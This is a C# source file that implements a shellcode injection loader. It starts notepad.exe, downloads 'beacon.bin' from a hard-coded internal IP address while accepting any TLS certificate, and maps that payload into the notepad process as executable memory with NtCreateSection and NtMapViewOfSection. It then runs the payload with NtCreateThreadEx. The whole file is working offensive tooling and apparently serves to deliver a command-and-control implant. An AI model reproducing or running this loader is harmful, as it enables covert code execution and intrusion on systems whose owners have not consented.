using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace NtMapViewOfSection
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            var si = new Native.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new Native.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new Native.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new Native.PROCESS_INFORMATION();

            var success = Native.CreateProcessW(
                "C:\\Windows\\System32\\notepad.exe",
                null,
                ref pa,
                ref ta,
                false,
                0,
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref si,
                out pi);

            if (success)
                Console.WriteLine("Process created with PID: {0}", pi.dwProcessId);
            else
                Console.WriteLine("Failed to create process. Error code: {0}.", Marshal.GetLastWin32Error());

            // Open handle to process
            var target = Process.GetProcessById(pi.dwProcessId);
            Console.WriteLine("Target Handle: 0x{0:X}", target.Handle.ToInt64());

            // Fetch shellcode
            byte[] shellcode;

            // Get shellcode
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("http://192.168.231.128:80/beacon.bin");
                }
            }

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // Create a new section in the current process
            Native.NtCreateSection(
                ref hSection,
                0x10000000,     // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref maxSize,
                0x40,           // PAGE_EXECUTE_READWRITE
                0x08000000,     // SEC_COMMIT
                IntPtr.Zero);

            // Map that section into memory of the current process as RW
            Native.NtMapViewOfSection(
                hSection,
                (IntPtr)(-1),   // will target the current process
                out var localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,              // ViewUnmap (created view will not be inherited by child processes)
                0,
                0x04);          // PAGE_READWRITE

            Console.WriteLine("Copying Shellcode!");

            // Copy shellcode into memory of our own process
            Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);

            // Now map this region into the target process as RX
            Native.NtMapViewOfSection(
                hSection,
                target.Handle,
                out var remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                0x20);      // PAGE_EXECUTE_READ

            Console.WriteLine("Shellcode Mapped!");

            // Shellcode is now in the target process, execute it (fingers crossed)
            Native.NtCreateThreadEx(
                out _,
                0x001F0000, // STANDARD_RIGHTS_ALL
                IntPtr.Zero,
                target.Handle,
                remoteBaseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            Console.WriteLine("Shellcode Executed!");
        }
    }
}